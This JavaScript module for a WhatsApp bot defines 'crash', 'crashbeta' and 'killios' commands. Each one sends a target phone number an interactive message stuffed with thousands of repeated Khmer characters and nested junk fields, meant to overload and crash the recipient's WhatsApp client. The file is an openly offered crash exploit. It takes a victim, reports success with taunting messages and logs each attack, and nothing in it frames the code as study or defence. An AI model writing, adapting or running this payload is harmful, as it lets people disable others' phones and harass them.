const { DateTime } = require('luxon');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

module.exports = {
  name: 'crash',
  aliases: ['crashbeta', 'killios'],
  description: 'Sends a payload to overload a WhatsApp client',
  async execute(message, args, conn, proto, generateWAMessageFromContent) {
    try {
      // Get current time using luxon
      const now = DateTime.local().toLocaleString(DateTime.DATETIME_FULL);

      // Check for target (e.g., mentioned JID or phone number)
      let target = args[0] || message.quoted?.sender || message.mentionedJid?.[0];
      if (!target) {
        return message.reply('Please provide a target (e.g., phone number or mention a user)!');
      }
      // Ensure target is in JID format (e.g., 123456789@s.whatsapp.net)
      if (!target.includes('@s.whatsapp.net')) {
        target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
      }

      // Overload function
      async function Overload(target) {
        const junk = "ឿ".repeat(5000); // Invisible characters

        const payload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: { text: junk + "XP - STORM🩸" + junk },
                footer: { buttonParamsJson: junk },
                header: {
                  subtitle: junk,
                  buttonParamsJson: junk,
                  hasMediaAttachment: false,
                },
                contextInfo: {
                  isForwarded: true,
                  forwardingScore: 999999,
                  mentionedJid: [target],
                  quotedMessage: {
                    buttonsMessage: {
                      contentText: junk,
                      footerText: junk,
                      buttons: Array(5).fill({
                        buttonId: junk,
                        buttonText: { displayText: junk },
                        type: 1,
                      }),
                      headerType: 1,
                    },
                  },
                  conversionSource: "🔥",
                  conversionData: crypto.randomBytes(16),
                  utm: {
                    utmSource: junk,
                    utmCampaign: junk,
                  },
                },
              },
            },
          },
        };

        // Create message with payload
        const msg = generateWAMessageFromContent(target, proto.Message.fromObject(payload), { userJid: target });

        // Send message
        await conn.relayMessage(target, msg.message, {
          messageId: msg.key.id,
        });
        console.log(`[IMMEDIATE FC] Sent to ${target}`);
      }

      // Execute Overload
      await Overload(target);

      // Tailored response based on command
      const command = message.content.toLowerCase().split(' ')[0];
      let response;
      if (command === '.crash') {
        response = `💥 Crash payload sent to ${target} at ${now}!`;
      } else if (command === '.crashbeta') {
        response = `🧪 Beta crash payload sent to ${target} at ${now}!`;
      } else if (command === '.killios') {
        response = `🍎 iOS kill payload sent to ${target} at ${now}! 💀`;
      }

      // Send response
      await message.reply(response);

      // Log command usage
      const logMessage = `[${now}] ${message.sender} used ${command} on ${target}\n`;
      fs.appendFileSync(path.join(__dirname, 'command.log'), logMessage);
    } catch (error) {
      console.error(`Error in crash command: ${error}`);
      await message.reply('⚠️ Error: Could not send crash payload!');
    }
  },
};